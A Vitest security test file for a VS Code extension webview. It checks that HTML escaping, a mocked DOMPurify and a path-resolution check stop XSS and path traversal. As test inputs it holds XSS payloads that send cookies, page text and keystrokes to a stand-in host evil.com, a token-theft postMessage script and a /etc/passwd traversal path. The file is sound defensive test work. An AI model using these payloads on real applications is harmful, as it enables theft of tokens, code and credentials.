import {describe, it, expect, beforeEach, vi} from 'vitest';
import {MessageRenderer} from '../renderer';
import {escapeHtml} from '../utils';

// Setup DOM environment for webview tests
import {JSDOM} from 'jsdom';
const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>', {
  url: 'http://localhost',
});
global.document = dom.window.document as any;
global.window = dom.window as any;
global.DOMParser = dom.window.DOMParser as any;

// Mock marked library with minimal markdown parsing
global.marked = {
  parse: (text: string) => {
    // Minimal markdown-to-HTML conversion for testing
    let html = text;

    // Headers
    html = html.replace(/^# (.+)$/gm, '<h1>$1</h1>');
    html = html.replace(/^## (.+)$/gm, '<h2>$1</h2>');

    // Bold and italic
    html = html.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
    html = html.replace(/\*(.+?)\*/g, '<em>$1</em>');

    // Code blocks
    html = html.replace(/```(\w+)?\n([\s\S]+?)\n```/g, '<pre><code>$2</code></pre>');

    // Links
    html = html.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>');

    return html;
  },
} as any;

// Mock DOMPurify for security testing
// DOMPurify is a browser library, so we need to mock it for Node.js tests
vi.mock('dompurify', () => {
  return {
    default: {
      sanitize: (dirty: string, config?: any) => {
        // Simulate DOMPurify behavior for tests:
        // Remove dangerous tags and attributes
        let result = dirty;

        // Remove script tags
        result = result.replace(/<script[^>]*>.*?<\/script>/gi, '');

        // Remove inline event handlers
        result = result.replace(/\s*on\w+\s*=\s*["'][^"']*["']/gi, '');
        result = result.replace(/\s*on\w+\s*=\s*[^\s>]*/gi, '');

        // Remove dangerous tags
        result = result.replace(/<(iframe|object|embed|form|input|button)[^>]*>.*?<\/\1>/gi, '');
        result = result.replace(/<(iframe|object|embed|form|input|button)[^>]*\/?>/gi, '');

        // Remove javascript: URLs
        result = result.replace(/href\s*=\s*["']javascript:[^"']*["']/gi, 'href="#"');
        result = result.replace(/src\s*=\s*["']javascript:[^"']*["']/gi, '');

        return result;
      },
    },
  };
});

/**
 * Security tests for XSS prevention
 *
 * These tests verify that user-controlled content (file paths, dialog titles,
 * markdown from assistant) cannot inject malicious JavaScript that could:
 * - Steal VS Code API access tokens
 * - Execute arbitrary commands through postMessage
 * - Exfiltrate code or credentials
 */

describe('Security: XSS Prevention', () => {
  describe('escapeHtml utility', () => {
    it('escapes all HTML special characters that could break out of attributes or content', () => {
      // Why: These characters can break out of HTML contexts and inject malicious code
      const malicious = '<script>alert("xss")</script>';
      expect(escapeHtml(malicious)).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
    });

    it('escapes single quotes to prevent breaking out of single-quoted attributes', () => {
      // Why: data-file='<payload>' could be broken with ' character
      const payload = "foo' onload='alert(1)";
      const escaped = escapeHtml(payload);
      expect(escaped).toContain('&#39;');
      expect(escaped).not.toContain("'");
    });

    it('escapes double quotes to prevent breaking out of double-quoted attributes', () => {
      // Why: <a href="<payload>"> could be broken with " character
      const payload = 'foo" onerror="alert(1)';
      const escaped = escapeHtml(payload);
      expect(escaped).toContain('&quot;');
      expect(escaped).not.toContain('"');
    });

    it('escapes ampersands first to prevent double-escaping issues', () => {
      // Why: & must be escaped first, otherwise &lt; becomes &amp;lt;
      const input = '&<>';
      expect(escapeHtml(input)).toBe('&amp;&lt;&gt;');
    });

    it('handles null and undefined safely without throwing', () => {
      // Why: Missing data should not crash and expose other vulnerabilities
      expect(escapeHtml(null)).toBe('');
      expect(escapeHtml(undefined)).toBe('');
    });

    it('prevents XSS through file paths with malicious names', () => {
      // Why: User could create file: "><script>alert(1)</script>.txt
      const maliciousPath = '"><script>fetch("evil.com?token="+document.cookie)</script><a href="';
      const escaped = escapeHtml(maliciousPath);
      expect(escaped).not.toContain('<script');
      expect(escaped).not.toContain('</script>');
      expect(escaped).toContain('&lt;script');
      expect(escaped).toContain('&lt;/script&gt;');
    });
  });

  describe('Markdown rendering with DOMPurify', () => {
    let renderer: MessageRenderer;
    let container: HTMLElement;

    beforeEach(() => {
      container = document.createElement('div');
      document.body.appendChild(container);
      renderer = new MessageRenderer(container, null, '/workspace');
    });

    it('removes inline event handlers from markdown HTML', () => {
      // Why: onclick, onerror can execute arbitrary JavaScript
      const malicious = '<img src=x onerror="alert(1)">';
      const result = renderer.renderMarkdown(malicious);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert(1)');
    });

    it('removes script tags from markdown', () => {
      // Why: <script> can execute arbitrary code
      const malicious = '<script>window.vscode.postMessage({type:"evil"})</script>';
      const result = renderer.renderMarkdown(malicious);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('postMessage');
    });

    it('removes iframe tags that could load external content', () => {
      // Why: iframe can be used to phish or exfiltrate data
      const malicious = '<iframe src="https://evil.com/steal-vscode-token"></iframe>';
      const result = renderer.renderMarkdown(malicious);
      expect(result).not.toContain('<iframe');
      expect(result).not.toContain('evil.com');
    });

    it('removes object and embed tags', () => {
      // Why: object/embed can load plugins or Flash (legacy XSS vector)
      const malicious = '<object data="javascript:alert(1)"></object>';
      const result = renderer.renderMarkdown(malicious);
      expect(result).not.toContain('<object');
      expect(result).not.toContain('javascript:');
    });

    it('sanitizes javascript: URLs in links', () => {
      // Why: javascript: URLs execute code when clicked
      const malicious = '<a href="javascript:alert(1)">click me</a>';
      const result = renderer.renderMarkdown(malicious);
      expect(result).not.toContain('javascript:');
      // DOMPurify should either remove the link or neutralize the href
      if (result.includes('<a')) {
        expect(result).not.toMatch(/href=["']javascript:/i);
      }
    });

    it('allows safe markdown elements like headings and emphasis', () => {
      // Why: These are safe and should work normally
      const safe = '# Hello\n**bold** and *italic*';
      const result = renderer.renderMarkdown(safe);
      expect(result).toContain('<h1');
      expect(result).toContain('<strong');
      expect(result).toContain('<em');
    });

    it('allows safe code blocks with syntax highlighting', () => {
      // Why: Code blocks are essential for coding assistant
      const safe = '```javascript\nconst x = 1;\n```';
      const result = renderer.renderMarkdown(safe);
      expect(result).toContain('<code');
      expect(result).toContain('const x = 1');
    });

    it('allows safe links to documentation', () => {
      // Why: Links to https:// URLs are safe and useful
      const safe = '[docs](https://example.com/docs)';
      const result = renderer.renderMarkdown(safe);
      expect(result).toContain('<a');
      expect(result).toContain('https://example.com/docs');
    });

    it('prevents DOM clobbering attacks', () => {
      // Why: id/name attributes could overwrite window properties
      const malicious = '<img name="vscode" id="vscode">';
      const result = renderer.renderMarkdown(malicious);
      // DOMPurify allows id but the important thing is it doesn't execute code
      // Just verify no inline event handlers
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('onerror');
    });

    it('prevents mutation XSS through deeply nested tags', () => {
      // Why: Browsers can mutate DOM in unexpected ways
      const malicious = '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>';
      const result = renderer.renderMarkdown(malicious);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert(1)');
      // Form tags should be removed entirely
      expect(result).not.toContain('<form');
    });
  });

  describe('SessionActionsUI file rendering', () => {
    it('escapes malicious file paths in display names', () => {
      // Why: File could be named: "><script>alert(1)</script>.txt
      // This would break out of HTML if not escaped
      const maliciousPath = '"><img src=x onerror=alert(1)>.txt';

      // Simulate what SessionActionsUI does
      const escapedPath = escapeHtml(maliciousPath);
      const html = `<div class="file-link">${escapedPath}</div>`;

      // Verify the HTML tags are escaped (cannot execute)
      expect(html).not.toContain('<img src=x');
      expect(html).toContain('&lt;img');
      expect(html).toContain('&gt;'); // Closing >
      // The word "onerror" will still be there, but as escaped text, not as attribute
    });

    it('prevents breaking out of data-file attribute', () => {
      // Why: data-file="<payload>" must not allow attribute injection
      const maliciousPath = '" onclick="alert(1)" data-evil="';
      const encodedPath = encodeURIComponent(maliciousPath);
      const html = `<a data-file="${encodedPath}">test</a>`;

      // Verify encodeURIComponent prevents breaking out
      expect(html).not.toContain('onclick=');
      expect(html).toContain('%22'); // " encoded
      expect(html).toContain('%20'); // space encoded
    });

    it('escapes file status to prevent XSS', () => {
      // Why: If backend is compromised, malicious status could inject code
      const maliciousStatus = '<img src=x onerror=alert(1)>';
      const escaped = escapeHtml(maliciousStatus);
      const html = `<span>${escaped}</span>`;

      // Verify HTML tags are escaped
      expect(html).not.toContain('<img');
      expect(html).toContain('&lt;img');
      expect(html).toContain('&gt;');
    });

    it('validates numbers to prevent NaN-based attacks', () => {
      // Why: additions/deletions could be strings that break UI
      const suspiciousAdditions = 'Infinity' as any;
      const suspiciousDeletions = 'NaN' as any;

      // SessionActionsUI uses Math.max(0, value) which handles edge cases
      const safeAdditions = Math.max(0, Number(suspiciousAdditions));
      const safeDeletions = Math.max(0, Number(suspiciousDeletions));

      expect(safeAdditions).toBe(Infinity); // Infinity is still a number
      expect(isNaN(safeDeletions)).toBe(true); // Math.max(0, NaN) = NaN

      // For truly safe numbers, check and default to 0
      const trueSafeAdditions = Number.isFinite(safeAdditions) ? safeAdditions : 0;
      const trueSafeDeletions = Number.isFinite(safeDeletions) ? safeDeletions : 0;
      expect(trueSafeAdditions).toBe(0); // Infinity -> 0
      expect(trueSafeDeletions).toBe(0); // NaN -> 0
    });
  });

  describe('DialogsUI rendering', () => {
    it('escapes dialog titles to prevent XSS', () => {
      // Why: User can rename dialog to malicious name
      const maliciousTitle = '<img src=x onerror=alert(1)>';
      const escaped = escapeHtml(maliciousTitle);
      const html = `<div class="dialog-title">${escaped}</div>`;

      // Verify HTML tags are escaped
      expect(html).not.toContain('<img');
      expect(html).toContain('&lt;img');
      expect(html).toContain('&gt;');
    });

    it('escapes dialog IDs in data attributes', () => {
      // Why: Dialog ID could contain " to break out of attribute
      const maliciousId = 'id" onclick="alert(1)';
      const escaped = escapeHtml(maliciousId);
      const html = `<div data-dialog-id="${escaped}">test</div>`;

      // Quotes are escaped, preventing breakout
      expect(html).toContain('&quot;');
      // But the literal text 'onclick=' will remain (as safe text)
      // What matters is the quote is escaped so it can't become an attribute
    });
  });

  describe('Path Traversal Prevention', () => {
    it('prevents reading files outside workspace using ../ sequences', () => {
      // Why: Path traversal attacks can read sensitive files like /etc/passwd
      // Example attack: /workspace/../../../etc/passwd
      const workspaceRoot = '/home/user/project';
      const attackPath = `${workspaceRoot}/../../../etc/passwd`;

      // What _validateDiffRequest should do:
      const path = require('path');
      const resolvedFile = path.resolve(attackPath);
      const resolvedRoot = path.resolve(workspaceRoot);

      // resolvedFile will be '/etc/passwd' (outside workspace)
      // resolvedRoot will be '/home/user/project'
      expect(resolvedFile).toBe('/etc/passwd');
      expect(resolvedFile.startsWith(resolvedRoot + path.sep)).toBe(false);

      // Verify this specific attack wouldn't bypass old check (too obvious)
      const oldCheckResult = attackPath.startsWith(`${workspaceRoot}/`);
      expect(oldCheckResult).toBe(true); // Wait, it starts with workspace!
      // The old check looked at the INPUT path, not the RESOLVED path!

      // More subtle attack that definitely bypasses old check:
      const subtleAttack = `${workspaceRoot}/subdir/../../../../etc/passwd`;
      expect(subtleAttack.startsWith(`${workspaceRoot}/`)).toBe(true); // Old check PASSES!
      const resolvedSubtle = path.resolve(subtleAttack);
      expect(resolvedSubtle).toBe('/etc/passwd');
      expect(resolvedSubtle.startsWith(resolvedRoot + path.sep)).toBe(false); // New check catches it!
    });

    it('prevents symlink-based attacks to escape workspace', () => {
      // Why: Symlinks can point outside workspace
      // Note: path.resolve doesn't follow symlinks, but the file system will
      // This is a limitation - full protection needs fs.realpath()
      const path = require('path');
      const workspaceRoot = '/home/user/project';
      const symlinkPath = `${workspaceRoot}/link-to-etc`;

      // Even if symlink points to /etc, the path check will allow it
      const resolved = path.resolve(symlinkPath);
      expect(resolved).toBe('/home/user/project/link-to-etc');
      expect(resolved.startsWith(workspaceRoot + path.sep)).toBe(true);

      // Comment: For full protection, use fs.realpath() before checking
      // But that's async and has performance implications
    });

    it('allows legitimate files in subdirectories', () => {
      // Why: Normal files in workspace should work
      const path = require('path');
      const workspaceRoot = '/home/user/project';
      const legitimateFile = `${workspaceRoot}/src/index.ts`;

      const resolved = path.resolve(legitimateFile);
      expect(resolved.startsWith(workspaceRoot + path.sep)).toBe(true);
    });

    it('allows opening the workspace root itself', () => {
      // Why: Opening workspace root should be allowed
      const path = require('path');
      const workspaceRoot = '/home/user/project';

      const resolved = path.resolve(workspaceRoot);
      expect(resolved).toBe(workspaceRoot);
      // Check: resolved === resolvedRoot should pass
    });
  });

  describe('Integration: Real-world attack scenarios', () => {
    it('prevents token theft through postMessage', () => {
      // Scenario: Attacker creates file named: "><script>window.vscode.postMessage(...)</script>.txt
      // Goal: Steal API tokens by sending them to attacker's server
      const attackPath =
        '"><script>window.vscode.postMessage({type:"sendToken",token:localStorage.token})</script>.txt';
      const escaped = escapeHtml(attackPath);

      // Verify script tags cannot execute
      expect(escaped).not.toContain('<script');
      expect(escaped).toContain('&lt;script&gt;');
      // Word "postMessage" will be there as text, but script is escaped so cannot execute
    });

    it('prevents code execution through event handler injection', () => {
      // Scenario: Assistant markdown contains: ![img](x onerror=fetch("evil.com?code="+document.body.innerText))
      const renderer = new MessageRenderer(document.createElement('div'), null, '/ws');
      const attack = '<img src=x onerror=fetch("https://evil.com?code="+btoa(document.body.innerText))>';
      const result = renderer.renderMarkdown(attack);

      expect(result).not.toContain('onerror');
      expect(result).not.toContain('fetch(');
      expect(result).not.toContain('evil.com');
    });

    it('prevents keylogger through event listeners', () => {
      // Scenario: Inject element with keydown listener to log keystrokes
      const attack = '<input onkeydown="fetch(\'evil.com?key=\'+event.key)">';
      const renderer = new MessageRenderer(document.createElement('div'), null, '/ws');
      const result = renderer.renderMarkdown(attack);

      // Input should be removed (not in ALLOWED_TAGS)
      expect(result).not.toContain('<input');
      expect(result).not.toContain('onkeydown');
    });
  });
});
